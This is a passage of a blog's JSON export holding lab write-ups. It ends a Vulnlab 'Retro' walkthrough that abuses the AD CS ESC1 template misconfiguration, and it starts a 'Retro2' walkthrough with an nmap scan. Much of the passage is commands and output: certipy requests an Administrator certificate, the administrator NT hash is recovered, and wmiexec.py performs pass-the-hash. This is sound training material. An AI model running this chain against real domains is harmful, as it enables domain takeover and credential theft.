Templates\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Template Name                       : RetroClients\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Display Name                        : Retro Clients\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Certificate Authorities             : retro-DC-CA\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Enabled                             : True\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Client Authentication               : True\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Enrollment Agent                    : False\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Any Purpose                         : False\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Enrollee Supplies Subject           : True\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Certificate Name Flag               : EnrolleeSuppliesSubject\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Enrollment Flag                     : None\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Private Key Flag                    : \u003cspan style=\"color:#ae81ff\"\u003e16842752\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Extended Key Usage                  : Client Authentication\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Requires Manager Approval           : False\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Requires Key Archival               : False\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Authorized Signatures Required      : \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Validity Period                     : \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e year\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Renewal Period                      : \u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003e weeks\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Minimum RSA Key Length              : \u003cspan style=\"color:#ae81ff\"\u003e4096\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    Permissions\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      Enrollment Permissions\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Enrollment Rights               : RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\D\u003c/span\u003eomain Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\D\u003c/span\u003eomain Computers\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\E\u003c/span\u003enterprise Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      Object Control Permissions\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Owner                           : RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003edministrator\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Write Owner Principals          : RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\D\u003c/span\u003eomain Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\E\u003c/span\u003enterprise Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003edministrator\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Write Dacl Principals           : RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\D\u003c/span\u003eomain Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\E\u003c/span\u003enterprise Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003edministrator\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        Write Property Principals       : RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\D\u003c/span\u003eomain Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\E\u003c/span\u003enterprise Admins\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                                          RETRO.VL\u003cspan style=\"color:#ae81ff\"\u003e\\A\u003c/span\u003edministrator\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e!\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Vulnerabilities\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ESC1                              : \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;RETRO.VL\\\\Domain Computers\u0026#39;\u003c/span\u003e can enroll, enrollee supplies subject and template allows client authentication\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ePerfect! We have a privilege escalation possibility with ESC1. This vulnerability allows a regular domain user to become domain admin.\u003c/p\u003e\n\u003ch2 id=\"exploitation-and-privilege-escalation\"\u003eExploitation and Privilege Escalation\u003c/h2\u003e\n\u003cp\u003eESC1 is a combination of several misconfigurations:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe Enterprise CA grants low-privileged users enrollment rights.\u003c/li\u003e\n\u003cli\u003eNo authorized signatures are required.\u003c/li\u003e\n\u003cli\u003eAn overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.\u003c/li\u003e\n\u003cli\u003eManager approval is disabled.\u003c/li\u003e\n\u003cli\u003eThe certificate template defines EKUs that enable authentication.\u003c/li\u003e\n\u003cli\u003eThe certificate template allows requesters to specify a subjectAltName in the CSR.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eTo exploit this vulnerability we need a computer account on the domain. Fortunately, we found a pre-created computer earlier. With this we can request a Kerberos ticket, which we can use to perform a pass-the-ticket attack with certipy to request a certificate with the UPN \u0026lsquo;Administrator\u0026rsquo;. This certificate will allow us to obtain the Administrator\u0026rsquo;s TGT to extract the Administrator\u0026rsquo;s NT hash from the ticket and use this hash in a pass-the-hash attack.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e// get TGT of BANKING$\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:09:25 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# getTGT.py -dc-ip 10.10.98.67 \u0026#39;retro.vl/banking$:banking\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eImpacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Saving ticket in banking$.ccache\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:11:05 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# export KRB5CCNAME=banking\\$.ccache\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:12:48 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# klist\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eTicket cache: FILE:banking$.ccache\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eDefault principal: banking$@RETRO.VL\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eValid starting       Expires              Service principal\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e10/14/2025 21:10:33  10/15/2025 07:10:33  krbtgt/RETRO.VL@RETRO.VL\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\trenew \u003cspan style=\"color:#66d9ef\"\u003euntil\u003c/span\u003e 10/15/2025 21:10:35\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e// request administrator certificate \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:16:44 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# certipy req -k -no-pass -ca retro-DC-CA -upn Administrator -template RetroClients -target dc.retro.vl -key-size 4096\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCertipy v4.8.2 - by Oliver Lyak \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ely4k\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Requesting certificate via RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Successfully requested certificate\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Request ID is \u003cspan style=\"color:#ae81ff\"\u003e11\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Got certificate with UPN \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Administrator\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Certificate has no object SID\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Saved certificate and private key to \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;administrator.pfx\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e// get NT hash of the administrator\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:18:01 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eCertipy v4.8.2 - by Oliver Lyak \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003ely4k\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Using principal: administrator@retro.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Trying to get TGT...\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Got TGT\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Saved credential cache to \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;administrator.ccache\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Trying to retrieve NT hash \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;administrator\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e*\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e Got hash \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;administrator@retro.vl\u0026#39;\u003c/span\u003e: aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e// pass-the-hash\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eOct 14, \u003cspan style=\"color:#ae81ff\"\u003e2025\u003c/span\u003e - 21:19:34 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eCEST\u003cspan style=\"color:#f92672\"\u003e)]\u003c/span\u003e exegol-vulnlab /workspace \u003cspan style=\"color:#75715e\"\u003e# wmiexec.py administrator@10.10.98.67 -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe are now connected as admin and can get the flag.\u003c/p\u003e\n\u003cp\u003eThanks for reading!\u003c/p\u003e\n","date":"2025-10-16","dateFormatted":"2025.10.16","excerpt":"\u003cp\u003eThis easy lab from Vulnlab allows us to practice using pre-created computer accounts and exploiting vulnerabilities in AD CS.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enetwork scan: \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e53/tcp \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","featured":null,"mood":null,"permalink":"http://localhost:1313/posts/retro/","readingTime":10,"slug":"index","subtitle":null,"summary":"\u003cp\u003eThis easy lab from Vulnlab allows us to practice using pre-created computer accounts and exploiting vulnerabilities in AD CS.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enetwork scan: \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eserver time: 2025-10-14 17:57:37Z\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3268/tcp open  ldap          Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro.vl0., Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eWe can see from the nmap scan the use of LDAPS, which could indicate the use of AD CS. This service allows the creation of a PKI to issue certificates.\u003c/p\u003e","tags":["misc"],"title":"Vulnlab : Retro Easy","url":"http://localhost:1313/posts/retro/","wordCount":2011},{"content":"\u003cp\u003eIn this lab, we will use pre-created computer accounts, abuse DACLs, and exploit an unpatched vulnerability to elevate our privileges.\u003c/p\u003e\n\u003ch2 id=\"reconnaissance\"\u003eReconnaissance\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNmap scan report \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e 10.10.90.89\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eHost is up \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e0.025s latency\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eNot shown: \u003cspan style=\"color:#ae81ff\"\u003e984\u003c/span\u003e filtered tcp ports \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eno-response\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePORT      STATE SERVICE            VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e53/tcp    open  domain             Microsoft DNS 6.1.7601 \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003e1DB15F75\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eWindows Server \u003cspan style=\"color:#ae81ff\"\u003e2008\u003c/span\u003e R2 SP1\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e88/tcp    open  kerberos-sec       Microsoft Windows Kerberos \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eserver time: 2025-10-15 16:00:43Z\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e135/tcp   open  msrpc              Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e389/tcp   open  ldap               Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro2.vl, Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e445/tcp   open  microsoft-ds       Microsoft Windows Server \u003cspan style=\"color:#ae81ff\"\u003e2008\u003c/span\u003e R2 - \u003cspan style=\"color:#ae81ff\"\u003e2012\u003c/span\u003e microsoft-ds \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eworkgroup: RETRO2\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e464/tcp   open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e593/tcp   open  ncacn_http         Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e636/tcp   open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3268/tcp  open  ldap               Microsoft Windows Active Directory LDAP \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eDomain: retro2.vl, Site: Default-First-Site-Name\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3269/tcp  open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e3389/tcp  open  ssl/ms-wbt-server?\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e49154/tcp open  msrpc              Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e49155/tcp open  msrpc              Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e49157/tcp open  ncacn_http         Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e49158/tcp open  msrpc              Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eService Info: Host: BLN01; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eOk, we are dealing with an Active Directory using a domain controller running Windows Server 2008 R2. I think there must already be CVEs for this version allowing us to quickly pwn the lab, but that\u0026rsquo;s probably not the intended path.\u003c/p\u003e\n\u003cp\u003eSo we will first enumerate the SMB shares.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" 